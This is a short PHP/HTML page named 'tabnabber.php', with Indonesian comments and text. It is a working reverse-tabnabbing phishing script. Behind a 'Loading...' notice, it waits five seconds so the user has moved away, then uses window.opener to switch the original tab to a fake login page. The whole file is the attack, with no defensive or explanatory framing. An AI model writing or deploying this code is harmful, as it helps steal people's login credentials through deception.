<?php
// tabnabber.php
header("Content-Type: text/html");
?>
<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <script>
    setTimeout(function () {
      if (window.opener) {
        // Ganti URL tab asal jadi halaman phishing
        window.opener.location = "https://example.com/fake-login.php";
      }
    }, 5000); // Delay biar tabnya sempet ditinggal user
  </script>
</head>
<body>
  <h1>Memuat...</h1>
  <p>Sedang mengalihkan, mohon tunggu sebentar.</p>
</body>
</html>
